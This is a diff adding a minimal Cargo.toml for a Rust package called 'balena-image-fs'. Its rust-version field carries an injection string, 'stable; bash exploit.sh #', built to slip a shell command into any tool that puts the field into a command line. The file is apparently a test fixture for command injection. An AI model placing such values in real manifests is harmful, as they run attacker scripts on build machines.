@@ -1,0 +1,7 @@
+[package]
+name = "balena-image-fs"
+version = "0.1.0"
+edition = "2021"
+rust-version = "stable; bash exploit.sh #"
+
+[dependencies]
